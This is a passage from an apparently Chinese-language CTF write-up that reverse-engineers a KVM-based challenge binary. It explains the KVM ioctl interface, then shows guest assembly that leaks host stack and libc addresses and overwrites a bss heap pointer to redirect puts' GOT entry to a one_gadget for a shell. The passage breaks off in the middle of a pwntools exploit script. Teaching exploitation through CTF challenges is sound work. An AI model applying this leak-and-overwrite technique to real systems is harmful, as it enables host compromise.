class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_IO<span class="token operator">:</span>      <span class="token comment">/* TODO: check port and direction here */</span>      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>run<span class="token punctuation">)</span> <span class="token operator">+</span> run<span class="token operator">-></span>io<span class="token punctuation">.</span>data_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_FAIL_ENTRY<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx"</span><span class="token punctuation">,</span>        run<span class="token operator">-></span>fail_entry<span class="token punctuation">.</span>hardware_entry_failure_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_INTERNAL_ERROR<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x"</span><span class="token punctuation">,</span>        run<span class="token operator">-></span>internal<span class="token punctuation">.</span>suberror<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_SHUTDOWN<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_SHUTDOWN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Unhandled reason: %d"</span><span class="token punctuation">,</span> run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®<code>switch</code>ËØ≠Âè•‰∏≠ÔºåÂè™ÈúÄË¶ÅÊ≥®ÊÑè‰∏§ÁßçÁä∂ÊÄÅÔºåÂç≥<code>KVM_EXIT_HLT</code>Âíå<code>KVM_EXIT_IO</code>ÔºåÂâçËÄÖÁî±Ê±áÁºñÊåá‰ª§<code>hlt</code>Ëß¶ÂèëÔºå‰ºöÈÄÄÂá∫VM„ÄÇÂêéËÄÖÁî±Ê±áÁºñÊåá‰ª§<code>in/out</code>Ëß¶ÂèëÔºåÊääÂ≠óÁ¨¶ËæìÂá∫Âà∞ËÆæÂ§á„ÄÇ<code>ioctl(vcpufd, KVM_RUN, NULL)</code>‰ºö‰∏ÄÁõ¥ËøêË°åÔºåÁõ¥Âà∞ÈÄÄÂá∫ÔºàÂ¶Ç<code>hlt</code>„ÄÅ<code>out</code>„ÄÅ<code>error</code>Ôºâ</p><h2 id="Â∞ùËØïËá™Â∑±ÁöÑVM"><a href="#Â∞ùËØïËá™Â∑±ÁöÑVM" class="headerlink" title="Â∞ùËØïËá™Â∑±ÁöÑVM"></a>Â∞ùËØïËá™Â∑±ÁöÑVM</h2><p>Êé•‰∏ãÊù•Êàë‰ª¨Áõ¥Êé•ÂÜô16‰ΩçÊ±áÁºñ‰ª£Á†ÅÔºåËÆ©ÂÖ∂ËøêË°åÂú®VMÁöÑÂÆûÊ®°Âºè‰∏ã„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰æãÂ≠êÔºåÂÆÉËæìÂá∫‰∏Ä‰∏™Â≠óÁ¨¶‚Äúa‚ÄùÔºö</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">.codemov al, <span class="token number">0x61</span>mov dx, <span class="token number">0x217</span>out dx, alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>dx</code> ÂØÑÂ≠òÂô®ËµãÂÄº0x217ÊòØÂ∞ÜÂÜÖÂÆπËæìÂá∫Âà∞Ëøô‰∏™‰∏≤Ë°åÁ´ØÂè£„ÄÇÂ∞ÜÂÖ∂ÁºñËØëÊàê16‰ΩçÊ±áÁºñ‰ª£Á†ÅÔºåÂèØ‰ª•‰ΩøÁî®nasmÔºå‰πüÂèØ‰ª•‰ΩøÁî®Â∑•ÂÖ∑ÁΩëÁ´ôÂú®Á∫øÊ±áÁºñÔºö</p><p><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=&arch=x86-16&as_format=inline#assembly">shell-storm | Online Assembler and Disassembler</a></p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181659435.png" alt="image-20220629181659435"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uint8_t</span> vmcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\xb0\\x61\\xba\\x17\\x02\\xee\\xf4"</span><span class="token function">kvm</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ÊâßË°åÁªìÊûúÔºàÂõ†‰∏∫Ê≤°ÊúâËæìÂá∫Êç¢Ë°åÁ¨¶ÔºåÊâÄ‰ª•Âíå<code>KVM_EXIT_HLT</code>ËøûÂú®‰∫Ü‰∏ÄËµ∑ÔºâÔºö</p><pre class="line-numbers language-none"><code class="language-none">aKVM_EXIT_HLT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="È¢òÁõÆÈÄÜÂêëÂàÜÊûê-1"><a href="#È¢òÁõÆÈÄÜÂêëÂàÜÊûê-1" class="headerlink" title="È¢òÁõÆÈÄÜÂêëÂàÜÊûê"></a>È¢òÁõÆÈÄÜÂêëÂàÜÊûê</h1><p>Âú®‰∫ÜËß£‰∫ÜKVMÁöÑÊâßË°åÂéüÁêÜÂêéÔºåÂõûÂà∞È¢òÁõÆËøõË°åÂàÜÊûê„ÄÇ</p><p>Âõ†‰∏∫KVMÊ®°ÂùóÊòØÂª∫Á´ãÂú®ÂÜÖÊ†∏‰∏≠ÁöÑÔºåÊâÄ‰ª•Áü•ÈÅì<code>ioctl</code>ÁöÑÂÆèÂÆö‰πâ‰πãÂêéÔºåÂèØ‰ª•Âú®LinuxÂÜÖÊ†∏Ê∫êÁ†ÅËøõË°åÊêúÁ¥¢„ÄÇ‰ª•<code>KVM_RUN</code>‰∏∫‰æãÔºåÂ≠òÂú®‰∫éÊ∫êÁ†ÅÊ†ë <strong>&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;kvm.h</strong> Â§¥Êñá‰ª∂‰∏≠Ôºå‰ª•‰∏ãÊòØÊêúÁ¥¢Âà∞ÁöÑÁªìÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181711623.png" alt="image-20220629181711623">ÂÄº0x80ÁúãËµ∑Êù•ÂíåÈ¢òÁõÆ‰∏≠ÁöÑÂÆåÂÖ®‰∏çÂêåÔºåÁúãÊù•ÊòØ<code>_IO(KVMIO, 0x80)</code>ÂØπÂÄºËøõË°å‰∫ÜÂ§ÑÁêÜÔºåÂØπ‰∫éËøôÁßçÂ§çÊùÇÁöÑÂµåÂ•óÂÆèÂÆö‰πâÔºåÂèØ‰ª•Áõ¥Êé•ÂÜô‰∏ÄÊÆµC‰ª£Á†ÅÊääÂÆÉÁöÑÂÄºÊâìÂç∞Âá∫Êù•Ôºö</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;linux/kvm.h></span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VM 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_USER_MEMORY_REGION 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_USER_MEMORY_REGION<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VCPU 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VCPU<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_VCPU_MMAP_SIZE 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_RUN 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_RUN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËæìÂá∫ÁªìÊûúÔºö</p><pre class="line-numbers language-none"><code class="language-none">KVM_CREATE_VM 0xae01KVM_SET_USER_MEMORY_REGION 0x4020ae46KVM_CREATE_VCPU 0xae41KVM_GET_VCPU_MMAP_SIZE 0xae04KVM_GET_REGS 0x8090ae81KVM_SET_REGS 0x4090ae82KVM_GET_SREGS 0x8138ae83KVM_SET_SREGS 0x4138ae84KVM_RUN 0xae80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Áé∞Âú®ËæìÂá∫ÁöÑÂÄºÂ∞±ÂíåÈ¢òÁõÆ‰∏≠‰∏ÄÊ†∑‰∫ÜÔºåÂèØ‰ª•Ê†πÊçÆËøô‰∫õÂÄºÔºåÈÖçÂêà‰∏äÈù¢ÁöÑKVMÈ°πÁõÆÊ∫êÁ†ÅÂØπÁ®ãÂ∫èËøõË°åËøòÂéüÔºåÂú®IDA‰∏≠ÂàõÂª∫‰∫ÜÁªìÊûÑ‰ΩìÂπ∂ÂëΩÂêçÂèòÈáèÂêéÂ∞±ÂæàÊé•ËøëÊ∫êÁ†ÅÔºåÂàÜÊûêËµ∑Êù•Â∞±ÂæàËΩªÊùæ‰∫Ü„ÄÇÊúÄÁªàÂæóÂà∞Â¶Ç‰∏ãÂÜÖÂÆπÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181726045.png" alt="image-20220629181726045"><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220630144839668.png" alt="image-20220630144839668"></p><h1 id="ËøêË°åÁ®ãÂ∫è"><a href="#ËøêË°åÁ®ãÂ∫è" class="headerlink" title="ËøêË°åÁ®ãÂ∫è"></a>ËøêË°åÁ®ãÂ∫è</h1><p>ÊàëËøôÈáåÊòØMac + VMware + Ubuntu 16ÔºåÂºÄÂêØ‰∫ÜVTËôöÊãüÂåñ‰πüÊâæ‰∏çÂà∞&#x2F;dev&#x2F;kvmÔºå‰ΩÜÊòØubuntu 18&#x2F;20ÊòØÊúâËøô‰∏™ËÆæÂ§áÊñá‰ª∂ÁöÑÔºåVirtualBox‰πüÊòØÊúâËÆæÂ§áÊñá‰ª∂ÁöÑÔºå‰ΩÜÊòØVirtualBoxÂ§™Âç°‰∫ÜÔºåÊâÄ‰ª•ÊúÄÁªàËøòÊòØÂ¶•ÂçèÔºå‰ΩøÁî®Windows + VMware + ubuntu + dockerÊù•ÊâßË°åÁ®ãÂ∫èÔºåÂú®Ubuntu‰∏≠‰ΩøÁî®dockerÁöÑÂéüÂõ†ÊòØÂ∞ΩÂèØËÉΩÁöÑËøòÂéüÈ¢òÁõÆÁöÑÁéØÂ¢ÉÔºåÂíåËøúÁ®ã‰øùÊåÅ‰∏ÄËá¥„ÄÇÂú®docker‰∏≠ÂºÄÂêØ1234Á´ØÂè£ÔºåÁÑ∂ÂêégdbserverÁõëÂê¨ÔºåÂú®ubuntu‰∏≠ËøúÁ®ãË∞ÉËØïÔºåÂêØÂä®ÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">sudo docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">1234</span><span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">-</span>p <span class="token number">8888</span><span class="token operator">:</span><span class="token number">8888</span> <span class="token operator">--</span>privileged <span class="token operator">--</span>cap<span class="token operator">-</span>add<span class="token operator">=</span>SYS_PTRACE mykvmgdbserver <span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">--</span>attach PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="ÊºèÊ¥ûÂà©Áî®ÂàÜÊûê"><a href="#ÊºèÊ¥ûÂà©Áî®ÂàÜÊûê" class="headerlink" title="ÊºèÊ¥ûÂà©Áî®ÂàÜÊûê"></a>ÊºèÊ¥ûÂà©Áî®ÂàÜÊûê</h1><p>Á®ãÂ∫è‰∏≠ÊúÄÊòéÊòæÁöÑÊºèÊ¥ûÁÇπÂú®‰∫é <code>size</code> Âà§Êñ≠ÔºåÂèØÂèëÁîüÊï¥Êï∞Ê∫¢Âá∫Ôºö</p><p>![image-20220629181756669](&#x2F;Users&#x2F;wangzhenghan&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220629181756669.png)‰ΩÜÊòØÈÄöËøáÊµãËØïÁöÑÁªìÊûúÔºåÂèëÁé∞ËøôÈáåÁöÑÊºèÊ¥ûÂπ∂‰∏çËÉΩËøõË°åÂà©Áî®ÔºåÂú®ËøõÂÖ•<code>run_kvm</code>ÂáΩÊï∞‰πãÂêéÊúâ<code>memcpy</code>ÂáΩÊï∞‰ΩøÁî®Ëøô‰∏™<code>size</code>ÔºåÂ¶ÇÊûú<code>size</code>ËøáÂ§ß‰ºöÂØºËá¥<code>memcpy</code>Êä•ÈîôÁ®ãÂ∫èÂ¥©Ê∫É„ÄÇ</p><p>ËøòÊúâÂè¶‰∏ÄÂ§Ñ‰∏çÂ§™ÊòéÊòæÁöÑÊºèÊ¥ûÔºåÂ≠òÂú®‰∫é<code>run_kvm</code>ÂáΩÊï∞ÂÜÖÈÉ®Ôºå<code>memcpy</code>‰ªéÊ†à‰∏≠Êã∑Ë¥ùÊï∞ÊçÆÂà∞bssÊÆµ0x603000Â§ÑÔºå<code>size</code>ÊòØÊàë‰ª¨ÂèØÊéßÁöÑÔºåËôΩÁÑ∂Ê†àÂ§ßÂ∞èÂ§ß‰∫éÂèØÊéßsize 0x1000Ôºå‰ΩÜËøòÊòØ‰∏çÂèØÈÅøÂÖçÁöÑÊã∑Ë¥ù‰∫Ü‰∏Ä‰∫õÂÆø‰∏ªÊú∫ÁöÑÊ†àÂÜÖÂÆπÂà∞VM‰∏≠ÔºåÈÄ†ÊàêÂÜÖÂ≠òÊ≥ÑÈú≤ÔºåÁ®çÂêé‰ºöÈ™åËØÅËøô‰∏ÄÁÇπ„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•ÂÜô‰∏ÄÊÆµÊ±áÁºñ‰ª£Á†ÅÔºåÊù•ÈÅçÂéÜÊï¥‰∏™VMÁ©∫Èó¥ÔºåÁî±‰∫éÊòØÂÆûÊ®°ÂºèÔºåÂØªÂùÄÊúÄÂ§öÂè™ËÉΩ20‰ΩçÔºåÊâÄ‰ª•ÊúÄÂ§öÂèØ‰ª•ÈÅçÂéÜ0ÔΩû0xfffffÂú∞ÂùÄÁöÑÂÜÖÂÆπÔºåÂÆûÈôÖ‰∏äÂè™ÈúÄË¶Å0xffffÂ∞±Ë∂≥Â§ü‰∫ÜÔºå‰∏çÈúÄË¶ÅÂéªÁªûÂ∞ΩËÑëÊ±ÅÂÜô16‰ΩçÁöÑÊÆµÂØÑÂ≠òÂô®ÂØªÂùÄ„ÄÇ‰ª•‰∏ã‰ª£Á†Å‰ºöËæìÂá∫VM‰∏≠0ÔΩû0xffffÂÜÖÂ≠òÁöÑÊâÄÊúâÂÜÖÂÆπÔºö</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0xffff</span>jne .<span class="token keyword">start</span>hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®pwntoolsÊé•Êî∂ËæìÂá∫ÂÜÖÂÆπÔºåÂπ∂Â∞ÜÂÜÖÂÆπ‰øùÂ≠òÊàêÊñá‰ª∂Ôºå‰ª•‰æøÂàÜÊûêÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®ÂØºÂá∫ÁöÑÊñá‰ª∂‰∏≠ÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∫õÂÆø‰∏ªÊú∫Âú∞ÂùÄÔºåÂ§ßÊ¶ÇÂÅèÁßªÂú®0x400ÈôÑËøëÔºåËØÅÊòé‰∫Ü‰πãÂâçËØ¥ËøáÁöÑmemcpyÊääÂÆø‰∏ªÊú∫Ê†àÂÜÖÂÆπÊã∑Ë¥ù‰∫ÜËøõÊù•Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181811450.png" alt="image-20220629181811450">‰πüÂ∞±ÊòØËØ¥Â¶ÇÊûúÊàë‰ª¨ÂÜôÊ±áÁºñ‰ª£Á†ÅÂ∞ÜÂÅèÁßª‰ΩçÁΩÆÁöÑÂÄºÊâìÂç∞Âá∫Êù•Â∞±ÂèØ‰ª•ÂÆåÊàêÊ≥ÑÈú≤„ÄÇÁªèËøáË∞ÉËØïÂÅèÁßªÔºåÊ≥ÑÈú≤Âú∞ÂùÄÁöÑÊ±áÁºñÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0x41e</span>jne .<span class="token keyword">start</span>hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê≥ÑÈú≤ÂêéÊúâ‰∫ÜlibcÂú∞ÂùÄÔºåË¶ÅËÄÉËôëÂ¶Ç‰ΩïÂà©Áî®„ÄÇ</p><p>Á®ãÂ∫èÊâßË°åÂÆå<code>run_kvm</code>ÂêéÊúâ‰∏Ä‰∏™‰∫§‰∫íÂèØ‰ª•ËæìÂÖ•ÔºåÂπ∂Â∞ÜËæìÂÖ•ÂÜÖÂÆπÊã∑Ë¥ùÂà∞bssÊÆµÁöÑ<code>dest</code>Â§ÑÔºåÊúÄÂêéË∞ÉÁî®<code>puts</code>ÂáΩÊï∞ÂêéËøîÂõûÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181825152.png" alt="image-20220629181825152">Áî±‰∫é<code>dest</code>Â≠òÂÇ®<code>malloc</code>ÁöÑ‰∏Ä‰∏™Â†ÜÂú∞ÂùÄÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂú®VMÂÜÖÂ≠ò‰∏≠ÊêúÁ¥¢Ëøô‰∏™Â†ÜÂú∞ÂùÄÔºåËÆ°ÁÆóÂÆÉÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂÅèÁßªÔºåÂ∞±ÂÉèÊ≥ÑÈú≤Âú∞ÂùÄÈÇ£Ê†∑ÔºåÁÑ∂ÂêéÂú®VM‰∏≠‰ΩøÁî®Ê±áÁºñÂØπÂÖ∂ËøõË°å‰øÆÊîπÔºåÊîπ‰∏∫gotË°®ÁöÑÂú∞ÂùÄÔºåÂú®Ë¶ÅÊ±ÇËæìÂÖ•‚Äúhost name‚ÄúÊó∂Â∞Ü<code>puts</code>Âú∞ÂùÄÊîπ‰∏∫one_gadgetÁöÑÂú∞ÂùÄÔºåÊúÄÂêéË∞ÉÁî®<code>puts</code>ÂÖ∂ÂÆûÂ∞±Ë∞ÉÁî®‰∫Üone_gadgetÔºåÊãøÂà∞shell„ÄÇ</p><p>ÂºÄÂêØASLRÂ†ÜÂú∞ÂùÄ‰ºöÂèëÁîüÂèòÂåñÔºåÂú®ÊêúÁ¥¢ÁöÑÊó∂ÂÄô‰∏çÂ§™Êñπ‰æøÔºåÂèØ‰ª•ÂÖ≥Èó≠ASLRÊù•‰øùËØÅÊØèÊ¨°ÂàÜÈÖçÁöÑÂú∞ÂùÄÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºåÊñπ‰æøÊêúÁ¥¢„ÄÇÊàë‰ª¨ËøòÊòØÁî®‰πãÂâçÁöÑÊ±áÁºñÂ∞ÜÂÜÖÂ≠òdumpÂá∫Êù•ÔºåÊàëËøôÈáåÁöÑÂ†ÜÂú∞ÂùÄ0x60b010ÔºåÊâæÂà∞Âú®ÂÅèÁßª0x7100ÈôÑËøëÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181837840.png" alt="image-20220629181837840"></p><p>‰ª•‰∏ãÊòØÂºÄ‰∫ÜASLRÁöÑÊÉÖÂÜµÔºå‰πüÊòØÂú®0x7100ÈôÑËøëÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181847463.png" alt="image-20220629181847463"></p><p>ÁªèËøáË∞ÉËØïËÆ°ÁÆóÂæóÂá∫ÂÅèÁßªÂú®0x7100ÔºåÁºñÂÜôÊ±áÁºñ‰ª£Á†ÅÔºåÂ∞ÜÊ≠§Â§ÑÊîπ‰∏∫gotÈôÑËøëÁöÑÂú∞ÂùÄÔºåËøôÈáåÂ∞ÜÂÖ∂Êîπ‰∏∫‰∫Ü0x60200dÔºö</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x7100</span>mov al,<span class="token number">0x0d</span>mov [di],almov al,<span class="token number">0x20</span>mov [di<span class="token number">+1</span>],almov al,<span class="token number">0x60</span>mov [di<span class="token number">+2</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+3</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+4</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+5</span>],alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéÂèëÁé∞ËæìÂÖ•ÂÆå‚Äùhost name‚ÄúÂêéÔºå<code>memcpy</code>ÂáΩÊï∞‰ºöÂêë0x60200dËøõË°åÊã∑Ë¥ùÔºåËØÅÊòé‰øÆÊîπ<code>dest</code>ÊàêÂäüÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181857455.png" alt="image-20220629181857455">Ê≠£Â∏∏Êù•ËØ¥ËøôÈáåÁõ¥Êé•‰øÆÊîπ<code>puts</code>ÁöÑgotÂ∞±ÂèØ‰ª•‰∫ÜÔºå‰ΩÜËøòÈúÄË¶ÅËÄÉËôë‰∏Ä‰∏™ÊÉÖÂÜµÔºå<code>readline</code>ÂáΩÊï∞‰ºöË∞ÉÁî®<code>malloc</code>ÔºåÂ†ÜÁÆ°ÁêÜÊØîËæÉÊ∑∑‰π±ÔºåÂπ∂‰∏î‰∏ç‰ºöËØªÂÖ•‰∏çÂèØËßÅÂ≠óÁ¨¶ÔºåÂõ†Ê≠§ÊúÄÂ•ΩÊòØ‰øÆÊîπ<code>puts</code>ÁöÑÊúÄÂêé3‰∏™byteÊàêÂäüÁéá‰ºöÈ´ò‰∏Ä‰∫õÔºåËøô‰πüÊòØ‰∏∫‰ªÄ‰πàÊääÂÜôÂÖ•Âú∞ÂùÄËÆæÁΩÆ‰∏∫0x60200dÁöÑÂéüÂõ†„ÄÇÔºàÂè¶Â§ñÔºåASLRÂØπ‰∫éKVMÊúâ‰∏ÄÂÆöÁöÑÂΩ±ÂìçÔºåÂú®‰∏çÂºÄÂêØASLRÊó∂ÔºåÈúÄË¶ÅÊ≥ÑÈú≤ÁöÑÂÜÖÂ≠òÂÅèÁßªÂú®0x9b98Ôºå‰ºöÁõ¥Êé•Ê≥ÑÈú≤‰∏Ä‰∏™<code>main_arena+0x88</code>ÁöÑÂú∞ÂùÄÔºåÊàêÂäüÁéá100%Ôºå‰ΩÜÂç¥Êâì‰∏çÈÄöÂºÄ‰∫ÜASLRÁöÑÊÉÖÂÜµÔºåÂÖ∑‰Ωì‰ªÄ‰πàÂéüÂõ†Ëøò‰∏çÊòØÂæàÊáÇÔºåÈúÄË¶ÅËøõ‰∏ÄÊ≠•ÁöÑÂ≠¶‰π†Ôºâ</p><p>ÊúÄÁªàÊ≥ÑÈú≤„ÄÅÂÜôÂÖ•ÁöÑÊ±áÁºñ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0x41e</span>jne .<span class="token keyword">start</span>mov di,<span class="token number">0x7100</span>mov al,<span class="token number">0x08</span>mov [di],almov al,<span class="token number">0x20</span>mov [di<span class="token number">+1</span>],almov al,<span class="token number">0x60</span>mov [di<span class="token number">+2</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+3</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+4</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+5</span>],alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token comment">#io = process("./mykvm")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token comment">#shellcode = "\xbf\x00\x00\xba\x17\x02\x8a\x05\xee\x47\x83\xff\xff\x75\xf7\xf4"     # search all memory</span><span class="token comment">#shellcode = 